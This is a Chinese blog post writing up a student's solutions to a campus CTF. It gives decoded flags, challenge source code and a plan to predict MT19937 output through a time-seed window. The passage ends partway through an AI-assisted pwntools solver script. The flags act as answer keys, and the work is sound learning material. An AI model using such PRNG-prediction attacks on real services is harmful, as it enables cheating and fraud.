<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark_colorblind" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
    <script defer src='https://cdn.jsdelivr.net/npm/mermaid@11.4.0/dist/mermaid.min.js'></script><script>document.addEventListener('DOMContentLoaded', function() { mermaid.initialize({startOnLoad: true, theme: 'default', securityLevel: 'loose'}); });</script>
    <link rel="icon" href="https://nopthon.github.io/burger.svg"><script>
        let theme = localStorage.getItem("meek_theme") || "light";
        document.documentElement.setAttribute("data-color-mode", theme);
    </script>
<meta name="description" content="一个零 CTF 经验的大二老登参加了校内的面向新生的 CTF 比赛，

这是他的 Writeup 发生的变化：

~~AI 还是太好用了~~ ~~AI 写的都啥代码~~ 我错了

---

### Misc01-CTF_101

> 欢迎参赛TrinityCTF!
>
> 作为一名参赛选手你首先需要看看靶场, 看看公告, 确保了解比赛规则详情!
>
> 善用互联网和工具, 希望你能在这场比赛中学习, 练习; 或是切身感受下CTF赛事的氛围与挑战
>
> 如果你发现你不会的还挺多, ~~那就对了~~ 我们每一名队员都是这么成长起来的, 赛后我们也会组织WP讲解, 欢迎来听 如果你发现你都会, 啊那太好了. 请在这场比赛尽情杀题~~然后大佬带飞我们战队把😆~~
>
> 最后祝各位解题顺利.

然后就要填 Flag 了，注意到在几天前发布的 TrinityCTF 2025 coming 赛事预告中有：

> 最后祝大家参赛愉快~~ZmxhZ3toNHBweV9oNGNrMW41IX0=~~取得好成绩

Base64 一下被划线的乱码得到 `flag{h4ppy_h4ck1n5!}`



### Misc02-搜打撤

提供了一个 py 文件和摩斯电码本，py 文件运行后是一个文字冒险游戏，在游玩过程中可以获得flag碎片，实际上可以直接翻 py 文件：

```python
WORK_SECRET = os.getenv('WORK_SECRET', 'dzBySw==')					# Base64: w0rK
COMBINE_SECRET = os.getenv('COMBINE_SECRET', 'YzBtYkluZSBhbDE=')	# Base64: c0mbIne al1
PASSWORD1 = os.getenv('PASSWORD1', 'TkpVZXI=')						# Base64: NJUer
PASSWORD2 = os.getenv('PASSWORD2', 'UEtVZXI=')						# Base64: PKUer
FLAG_SECRET = os.getenv('FLAG_SECRET', 'ZmxhZw==')					# Base64: flag
# 省略一部分内容...
def exit_gate():
    '''校门撤离点'''
    print('祝贺你得到了想要的东西。">
<meta property="og:title" content="TrinityCTF 2025 Writeup">
<meta property="og:description" content="一个零 CTF 经验的大二老登参加了校内的面向新生的 CTF 比赛，

这是他的 Writeup 发生的变化：

~~AI 还是太好用了~~ ~~AI 写的都啥代码~~ 我错了

---

### Misc01-CTF_101

> 欢迎参赛TrinityCTF!
>
> 作为一名参赛选手你首先需要看看靶场, 看看公告, 确保了解比赛规则详情!
>
> 善用互联网和工具, 希望你能在这场比赛中学习, 练习; 或是切身感受下CTF赛事的氛围与挑战
>
> 如果你发现你不会的还挺多, ~~那就对了~~ 我们每一名队员都是这么成长起来的, 赛后我们也会组织WP讲解, 欢迎来听 如果你发现你都会, 啊那太好了. 请在这场比赛尽情杀题~~然后大佬带飞我们战队把😆~~
>
> 最后祝各位解题顺利.

然后就要填 Flag 了，注意到在几天前发布的 TrinityCTF 2025 coming 赛事预告中有：

> 最后祝大家参赛愉快~~ZmxhZ3toNHBweV9oNGNrMW41IX0=~~取得好成绩

Base64 一下被划线的乱码得到 `flag{h4ppy_h4ck1n5!}`



### Misc02-搜打撤

提供了一个 py 文件和摩斯电码本，py 文件运行后是一个文字冒险游戏，在游玩过程中可以获得flag碎片，实际上可以直接翻 py 文件：

```python
WORK_SECRET = os.getenv('WORK_SECRET', 'dzBySw==')					# Base64: w0rK
COMBINE_SECRET = os.getenv('COMBINE_SECRET', 'YzBtYkluZSBhbDE=')	# Base64: c0mbIne al1
PASSWORD1 = os.getenv('PASSWORD1', 'TkpVZXI=')						# Base64: NJUer
PASSWORD2 = os.getenv('PASSWORD2', 'UEtVZXI=')						# Base64: PKUer
FLAG_SECRET = os.getenv('FLAG_SECRET', 'ZmxhZw==')					# Base64: flag
# 省略一部分内容...
def exit_gate():
    '''校门撤离点'''
    print('祝贺你得到了想要的东西。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://Nopthon.github.io/post/TrinityCTF%202025%20Writeup.html">
<meta property="og:image" content="https://nopthon.github.io/burger.svg">
<title>TrinityCTF 2025 Writeup</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>
<style>
pre, code, pre code {
    tab-size: 4 !important;
    -moz-tab-size: 4 !important;
}
.mermaid {
    background-color: white;
    border-radius: 8px;
    padding: 16px;
    margin: 16px 0;
    text-align: center;
}
</style><style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-warning {border-left-color:var(--borderColor-attention-emphasis, var(--color-attention-emphasis));background-color:var(--color-attention-subtle);}.markdown-alert.markdown-alert-warning .markdown-alert-title {color: var(--fgColor-attention,var(--color-attention-fg));}</style>



<body>
    <div id="header">
<h1 class="postTitle">TrinityCTF 2025 Writeup</h1>
<div class="title-right">
    <a href="https://Nopthon.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/Nopthon/Nopthon.github.io/issues/6" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p>一个零 CTF 经验的大二老登参加了校内的面向新生的 CTF 比赛，</p>
<p>这是他的 Writeup 发生的变化：</p>
<p><del>AI 还是太好用了</del> <del>AI 写的都啥代码</del> 我错了</p>
<hr>
<h3>Misc01-CTF_101</h3>
<blockquote>
<p>欢迎参赛TrinityCTF!</p>
<p>作为一名参赛选手你首先需要看看靶场, 看看公告, 确保了解比赛规则详情!</p>
<p>善用互联网和工具, 希望你能在这场比赛中学习, 练习; 或是切身感受下CTF赛事的氛围与挑战</p>
<p>如果你发现你不会的还挺多, <del>那就对了</del> 我们每一名队员都是这么成长起来的, 赛后我们也会组织WP讲解, 欢迎来听 如果你发现你都会, 啊那太好了. 请在这场比赛尽情杀题<del>然后大佬带飞我们战队把😆</del></p>
<p>最后祝各位解题顺利.</p>
</blockquote>
<p>然后就要填 Flag 了，注意到在几天前发布的 TrinityCTF 2025 coming 赛事预告中有：</p>
<blockquote>
<p>最后祝大家参赛愉快~~ZmxhZ3toNHBweV9oNGNrMW41IX0=~~取得好成绩</p>
</blockquote>
<p>Base64 一下被划线的乱码得到 <code class="notranslate">flag{h4ppy_h4ck1n5!}</code></p>
<h3>Misc02-搜打撤</h3>
<p>提供了一个 py 文件和摩斯电码本，py 文件运行后是一个文字冒险游戏，在游玩过程中可以获得flag碎片，实际上可以直接翻 py 文件：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c1">WORK_SECRET</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'WORK_SECRET'</span>, <span class="pl-s">'dzBySw=='</span>)					<span class="pl-c"># Base64: w0rK</span>
<span class="pl-c1">COMBINE_SECRET</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'COMBINE_SECRET'</span>, <span class="pl-s">'YzBtYkluZSBhbDE='</span>)	<span class="pl-c"># Base64: c0mbIne al1</span>
<span class="pl-v">PASSWORD1</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'PASSWORD1'</span>, <span class="pl-s">'TkpVZXI='</span>)						<span class="pl-c"># Base64: NJUer</span>
<span class="pl-v">PASSWORD2</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'PASSWORD2'</span>, <span class="pl-s">'UEtVZXI='</span>)						<span class="pl-c"># Base64: PKUer</span>
<span class="pl-c1">FLAG_SECRET</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'FLAG_SECRET'</span>, <span class="pl-s">'ZmxhZw=='</span>)					<span class="pl-c"># Base64: flag</span>
<span class="pl-c"># 省略一部分内容...</span>
<span class="pl-k">def</span> <span class="pl-en">exit_gate</span>():
    <span class="pl-s">"""校门撤离点"""</span>
    <span class="pl-en">print</span>(<span class="pl-s">"祝贺你得到了想要的东西。按照通顺的语言习惯组合即可。不要忘记在单词之间加入短下划线_哦~"</span>)
    <span class="pl-k">return</span> <span class="pl-c1">1</span></pre></div>
<p>把三个 secret 按照语序拼接得到 <code class="notranslate">flag{c0mbIne_al1_w0rK}</code> （一开始我一直尝试把 <code class="notranslate">NJUer</code> 塞进去😰）</p>
<h3>Misc03-Watch the Star</h3>
<p>提供了一个 <code class="notranslate">coords.txt</code> 记录了若干个点坐标，以及一个 <code class="notranslate">star.png</code> 绘制了部分点的位置和连线</p>
<p>用 matplotlib 库绘图，发现连线没有任何线索，但是点的排布很有意思（特别是↖↗↙三个角的暗示）</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fcdab66ee595528766cd39df952319f57efdf5190c7a9158ae0ac5b3a31c89d9/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130333434343630322e706e67"><img src="https://camo.githubusercontent.com/fcdab66ee595528766cd39df952319f57efdf5190c7a9158ae0ac5b3a31c89d9/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130333434343630322e706e67" alt="image-20251006103444602" data-canonical-src="https://nopthon.github.io/image-20251006103444602.png" style="max-width: 100%;"></a></p>
<p>把点替换成大小为1的方格，删去连线，得到：</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7392c952e80b9b495275e6aa0a0ddfcc141ead7676441b8f64e147965deca60d/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130343330303037312e706e67"><img src="https://camo.githubusercontent.com/7392c952e80b9b495275e6aa0a0ddfcc141ead7676441b8f64e147965deca60d/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130343330303037312e706e67" alt="image-20251006104300071" data-canonical-src="https://nopthon.github.io/image-20251006104300071.png" style="max-width: 100%;"></a></p>
<p>是个二维码，扫描得到 <code class="notranslate">flag:bWlzY19maW5pc2g=</code>， Base64 一下得到 <code class="notranslate">flag{misc_finish}</code></p>
<h3><strong>Misc04-猫猫</strong>（Unfinished）</h3>
<p>图片里藏了一个 zip 文件用 binwalk 分离，压缩包里有 <code class="notranslate">flag.txt</code> 但是解压需要密码</p>
<p>对剩下的纯图片内容 zsteg 一下发现下面的内容：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">imagedata           .. text: <span class="pl-s"><span class="pl-pds">"</span>.55/4.,-)<span class="pl-pds">"</span></span>
b1,g,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>-M<span class="pl-smi">$ED</span>%LtLm<span class="pl-cce">\\\\</span>uT<span class="pl-pds">"</span></span>
b1,b,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>5m,5<span class="pl-smi">$5</span>l4ee}----(<span class="pl-pds">"</span></span>
b2,r,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>D@@EDkDD<span class="pl-pds">"</span></span>
b2,rgb,lsb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>L0DDTAA@E<span class="pl-pds">"</span></span>
b2,rgb,msb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>\n{&lt;g[6e{<span class="pl-pds">"</span></span>
b3,g,msb,xy         .. file: OpenPGP Secret Key
b4,r,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>2222<span class="pl-cce">\"</span>2R2#5TTDDTTUETFfvvvvgvvvv<span class="pl-pds">"</span></span>
b4,r,msb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>];;;;;;{<span class="pl-pds">"</span></span>
b4,g,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>223#323323ETTEUUTggTvvggvgwgvy<span class="pl-pds">"</span></span>
b4,b,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>wvfgwvvfwv<span class="pl-pds">"</span></span>
b4,rgb,lsb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>A62s&amp;3p5<span class="pl-pds">"</span></span>
b4,rgb,msb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>,Fb<span class="pl-smi">$Nb$N</span><span class="pl-pds">"</span></span>
b4,bgr,lsb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>QB63r6 s<span class="pl-pds">"</span></span>
b4,bgr,msb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>J&amp;dB.dB.<span class="pl-pds">"</span></span></pre></div>
<p>不会解，遂放弃</p>
<h3>Misc05-填填问卷就能拿分谢谢喵</h3>
<p>字面意思，这我还能说什么呢，太性情了哥们，flag 没保存所以不贴了</p>
<p>ps: 我拿的一血🤓</p>
<hr>
<h3>Crypto01-RSA (Unfinished)</h3>
<p>一个菜单环境，提供了离线的 Python 搭建：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">from</span> <span class="pl-v">Crypto</span>.<span class="pl-v">Util</span>.<span class="pl-s1">number</span> <span class="pl-k">import</span> <span class="pl-s1">bytes_to_long</span>
<span class="pl-k">import</span> <span class="pl-s1">os</span>, <span class="pl-s1">signal</span>
<span class="pl-k">import</span> <span class="pl-s1">utils</span>

<span class="pl-s1">signal</span>.<span class="pl-c1">alarm</span>(<span class="pl-c1">600</span>)								<span class="pl-c"># 600s 的限时，也就是 TLE 机制（？</span>
<span class="pl-k">assert</span> <span class="pl-s1">utils</span>.<span class="pl-c1">PoW</span>()								<span class="pl-c"># 一个需要暴力算 sha256 的工作量证明</span>
<span class="pl-s1">sec</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">urandom</span>(<span class="pl-c1">16</span>)

<span class="pl-c1">MENU</span> <span class="pl-c1">=</span> <span class="pl-s">'''</span>
<span class="pl-s">[E]ncrypt</span>
<span class="pl-s">[G]etFlag</span>
<span class="pl-s">[Q]uit</span>
<span class="pl-s">'''</span>
<span class="pl-k">while</span> <span class="pl-c1">True</span>:
    <span class="pl-en">print</span>(<span class="pl-c1">MENU</span>)
    <span class="pl-s1">inp</span> <span class="pl-c1">=</span> <span class="pl-en">input</span>(<span class="pl-s">"&gt;"</span>).<span class="pl-c1">lower</span>()
    <span class="pl-k">try</span>:
        <span class="pl-k">if</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"q"</span>:							<span class="pl-c"># q 键退出</span>
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"e"</span>:						<span class="pl-c"># e 键会提供一个用相同的公钥指数 e=4027 和明文，用不同的模数加密的结果</span>
            <span class="pl-s1">rsa</span> <span class="pl-c1">=</span> <span class="pl-s1">utils</span>.<span class="pl-c1">RSA</span>(<span class="pl-s1">nbits</span><span class="pl-c1">=</span><span class="pl-c1">1024</span>)
            <span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-s1">rsa</span>.<span class="pl-c1">encrypt</span>(<span class="pl-en">bytes_to_long</span>(<span class="pl-s1">sec</span>))
            <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">rsa</span>.<span class="pl-c1">pub</span> <span class="pl-c1">=</span> <span class="pl-kos">}</span></span><span class="pl-cce">\n</span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-kos">}</span></span>"</span>)

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"g"</span>:						<span class="pl-c"># g 键用解出的明文换取 flag</span>
            <span class="pl-k">assert</span> <span class="pl-s1">sec</span> <span class="pl-c1">==</span> <span class="pl-s1">bytes</span>.<span class="pl-c1">fromhex</span>(<span class="pl-en">input</span>(<span class="pl-s">"sec&gt;"</span>).<span class="pl-c1">strip</span>())
            <span class="pl-s1">utils</span>.<span class="pl-c1">solve</span>()
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>

    <span class="pl-k">except</span>:
        <span class="pl-k">break</span></pre></div>
<p>赛时考虑使用 <strong>Håstad广播攻击</strong>，需要收集 4097 组数据但是被 600s 时限卡住了（600s 只能收集 1k 组不到的数据，而 1k 组数据破解的概率太低了），遂 giveup</p>
<p><strong>Crypto02-PQC</strong>  和 <strong>Crypto03-ECC</strong> 都没碰</p>
<h3>Crypto04-PRNG</h3>
<p>四道 Crypto 的环境搭建都是相似的：</p>
<p><code class="notranslate">task.py</code></p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">signal</span>
<span class="pl-k">import</span> <span class="pl-s1">utils</span>

<span class="pl-s1">signal</span>.<span class="pl-c1">alarm</span>(<span class="pl-c1">600</span>)
<span class="pl-k">assert</span> <span class="pl-s1">utils</span>.<span class="pl-c1">PoW</span>()

<span class="pl-s1">casino</span> <span class="pl-c1">=</span> <span class="pl-s1">utils</span>.<span class="pl-c1">CASINO</span>()											<span class="pl-c"># 构建了一个 casino 猜数游戏</span>
																<span class="pl-c"># 初始有一定的分数</span>
<span class="pl-c1">MENU</span> <span class="pl-c1">=</span> <span class="pl-s">'''</span>
<span class="pl-s">[R]efresh</span>
<span class="pl-s">[H]it</span>
<span class="pl-s">[S]tand</span>
<span class="pl-s">[Q]uit</span>
<span class="pl-s">'''</span>
<span class="pl-k">while</span> <span class="pl-c1">True</span>:
    <span class="pl-en">print</span>(<span class="pl-c1">MENU</span>)
    <span class="pl-s1">inp</span> <span class="pl-c1">=</span> <span class="pl-en">input</span>(<span class="pl-s">"&gt;"</span>).<span class="pl-c1">lower</span>()
    <span class="pl-k">try</span>:
        <span class="pl-k">if</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"q"</span>:											<span class="pl-c"># q 键退出游戏</span>
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>
        
        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"r"</span>:										<span class="pl-c"># r 键重置游戏</span>
            <span class="pl-s1">casino</span>.<span class="pl-c1">refresh</span>()

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"h"</span>:										<span class="pl-c"># h 键进行猜数，要猜的数是随机数</span>
            <span class="pl-s1">card</span> <span class="pl-c1">=</span> <span class="pl-s1">casino</span>.<span class="pl-c1">card</span>()
            <span class="pl-k">if</span> (<span class="pl-s1">card</span> <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFF</span>) <span class="pl-c1">==</span> <span class="pl-en">int</span>(<span class="pl-en">input</span>(<span class="pl-s">"check&gt;"</span>)):
                <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>								<span class="pl-c"># 猜对了加一分</span>
                <span class="pl-en">print</span>(<span class="pl-s">"Positive"</span>)
            <span class="pl-k">else</span>:
                <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>								<span class="pl-c"># 猜错了扣两分</span>
                <span class="pl-en">print</span>(<span class="pl-s">"Negative"</span>)
                <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">card</span> <span class="pl-c1">=</span> <span class="pl-kos">}</span></span>"</span>)								<span class="pl-c"># 并且会告知正确的数是什么</span>

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"s"</span>:										<span class="pl-c"># 在得分 ≥ 9999 时按下 s 键获得 Flag</span>
            <span class="pl-k">assert</span> <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">&gt;=</span> <span class="pl-c1">9999</span>
            <span class="pl-s1">utils</span>.<span class="pl-c1">solve</span>()
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>

        <span class="pl-k">assert</span> <span class="pl-s1">casino</span>.<span class="pl-c1">score</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span>									<span class="pl-c"># 分数归零时退出游戏</span>
    <span class="pl-k">except</span>:
        <span class="pl-k">break</span></pre></div>
<p>目前掌握的信息不够，所以我们需要在另一个下发的文件中获取更多信息：</p>
<p><code class="notranslate">utils.py</code> （节选）</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">class</span> <span class="pl-c1">CASINO</span>:
    <span class="pl-k">def</span> <span class="pl-en">__init__</span>(<span class="pl-s1">self</span>):											<span class="pl-c"># 初始化</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">urandom</span>(<span class="pl-c1">16</span>)								<span class="pl-c"># 生成一个密钥 key</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">rng</span> <span class="pl-c1">=</span> <span class="pl-s1">random</span>.<span class="pl-c1">Random</span>()								<span class="pl-c"># 创建一个随机数生成器</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">refresh</span>()											<span class="pl-c"># 进行一次刷新操作</span>

    <span class="pl-k">def</span> <span class="pl-en">refresh</span>(<span class="pl-s1">self</span>):											<span class="pl-c"># 刷新操作</span>
        <span class="pl-s1">seed</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-en">pow</span>(<span class="pl-s1">time</span>.<span class="pl-c1">time</span>(), <span class="pl-c1">0.93</span>))						<span class="pl-c"># 基于当前时间的种子 seed（一个伏笔）</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">rng</span>.<span class="pl-c1">seed</span>(<span class="pl-en">bytes_to_long</span>(<span class="pl-s1">self</span>.<span class="pl-c1">key</span>) <span class="pl-c1">+</span> <span class="pl-s1">seed</span>)			<span class="pl-c"># 随机数生成器基于 key + seed 生成新的生成器种子</span>
        <span class="pl-s1">self</span>.<span class="pl-c1">score</span> <span class="pl-c1">=</span> <span class="pl-c1">0x4c4</span>										<span class="pl-c"># 初始分数为 610 * 2 分</span>
    
    <span class="pl-k">def</span> <span class="pl-en">card</span>(<span class="pl-s1">self</span>):												<span class="pl-c"># 发牌操作</span>
        <span class="pl-k">return</span> <span class="pl-s1">self</span>.<span class="pl-c1">rng</span>.<span class="pl-c1">getrandbits</span>(<span class="pl-c1">32</span>)							<span class="pl-c"># 利用随机数生成器生成一个 32 位随机数</span></pre></div>
<p><code class="notranslate">random.Random()</code> 说明程序使用了 Python 自带了的随机数计算：伪随机数生成器 mt19937。</p>
<p>这个随机数算法对于相同的种子总会给出相同的输出结果，且算法上可以逆向实现随机数预测，前提是先要获取<strong>连续的 624 个 32 位</strong>的已生成的随机数（这么多的数据足够找到循环点），这里考虑使用 <code class="notranslate">randcrack</code> 库</p>
<p>然而，初始分数 <code class="notranslate">610 * 2</code> ，但是 624 次错误的猜数会扣除 <code class="notranslate">624 * 2</code> 的分数，所以我没有办法连续猜错 624 次，必须要猜对若干次</p>
<p>在观察了四道 Crypto 题目的框架后，我发现只有第四题提供了重置操作 <code class="notranslate">r</code>。为什么要提供一个 <code class="notranslate">r</code> 键重置？虽然 <code class="notranslate">r</code> 键可以重置得分，但是也会重置 <code class="notranslate">self.rng.seed</code>，也就是随机数生成器的种子，看上去 <code class="notranslate">r</code> 操作没有作用</p>
<blockquote>
<p>除非 <code class="notranslate">r</code> 操作并不是一定会重置随机数生成器的种子？</p>
</blockquote>
<p>仔细看一下随机数生成器的种子是如何被计算的：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-s1">seed</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-en">pow</span>(<span class="pl-s1">time</span>.<span class="pl-c1">time</span>(), <span class="pl-c1">0.93</span>))				<span class="pl-c"># (int)(时间戳 ^ 0.93)</span>
<span class="pl-s1">self</span>.<span class="pl-c1">rng</span>.<span class="pl-c1">seed</span>(<span class="pl-en">bytes_to_long</span>(<span class="pl-s1">self</span>.<span class="pl-c1">key</span>) <span class="pl-c1">+</span> <span class="pl-s1">seed</span>)	<span class="pl-c"># key + seed，其中 key 不会随着 r 操作改变，改变 seed</span></pre></div>
<p>对于 <code class="notranslate">(int)(时间戳 ^ 0.93)</code> 这一步，我们不难发现，当两个时间戳非常接近时，计算得到的种子是完全相同的</p>
<blockquote>
<p>比如我现在查询时间戳得到的数值是 <code class="notranslate">1759734250</code>，不难计算</p>
<p><code class="notranslate">(int)1759734250^0.93 == (int)1759734252^0.93 == 396520633</code>，得到了 3s 的窗口期</p>
<p>如果刷新的时间恰当，<strong>最大可以争取约 5s 的窗口期</strong>，这段时间内的 <code class="notranslate">r</code> 刷新操作不会改变 <code class="notranslate">seed</code> 值</p>
</blockquote>
<p>于是我们得到了一个自动化方案：</p>
<ol>
<li>解决 PoW 问题（写一段暴力计算的程序即可）</li>
<li>先答错获取前十个随机数，保存（这里的十次实际上可以更少一些，这取决于网速）</li>
<li><code class="notranslate">r</code> 刷新一次</li>
<li>用之前获取的前十个随机数去回答前十次猜数问题（不会扣分，而且会加分）</li>
<li>继续猜错直到获取了 624 个随机数（可以保证分数不会减到 0 以下）</li>
<li>现在 mt19937 的随机数可以完全预测了，持续猜对数字直到分数超过 9999</li>
<li><code class="notranslate">s</code> 获取 Flag！</li>
</ol>
<p>用 AI 辅助写了一段自动化的 Python 程序（<del>我不会 Python</del>）</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">hashlib</span>
<span class="pl-k">import</span> <span class="pl-s1">string</span>
<span class="pl-k">import</span> <span class="pl-s1">itertools</span>
<span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span>
<span class="pl-k">from</span> <span class="pl-s1">randcrack</span> <span class="pl-k">import</span> <span class="pl-v">RandCrack</span>

<span class="pl-k">def</span> <span class="pl-en">solve_pow</span>(<span class="pl-s1">prefix</span>, <span class="pl-s1">target_hash</span>, <span class="pl-s1">length</span><span class="pl-c1">=</span><span class="pl-c1">4</span>):
    <span class="pl-c"># 爆破 XXXX</span>
    <span class="pl-k">for</span> <span class="pl-s1">comb</span> <span class="pl-c1">in</span> <span class="pl-s1">itertools</span>.<span class="pl-c1">product</span>(<span class="pl-s1">string</span>.<span class="pl-c1">ascii_letters</span> <span class="pl-c1">+</span> <span class="pl-s1">string</span>.<span class="pl-c1">digits</span>, <span class="pl-s1">repeat</span><span class="pl-c1">=</span><span class="pl-s1">length</span>):
        <span class="pl-s1">attempt</span> <span class="pl-c1">=</span> <span class="pl-s">''</span>.<span class="pl-c1">join</span>(<span class="pl-s1">comb</span>)
        <span class="pl-s1">h</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">sha256</span>((<span class="pl-s1">attempt</span> <span class="pl-c1">+</span> <span class="pl-s1">prefix</span>).<span class="pl-c1">encode</span>()).<span class="pl-c1">hexdigest</span>()
        <span class="pl-k">if</span> <span class="pl-s1">h</span> <span class="pl-c1">==</span> <span class="pl-s1">target_hash</span>:
            <span class="pl-k">return</span> <span class="pl-s1">attempt</span>
    <span class="pl-k">return</span> <span class="pl-c1">None</span>

<span class="pl-k">def</span> <span class="pl-en">main</span>():
    <span class="pl-c"># 连接信息：</span>
    <span class="pl-c"># xxx.xxx.xxx.xx:xxxxx</span>
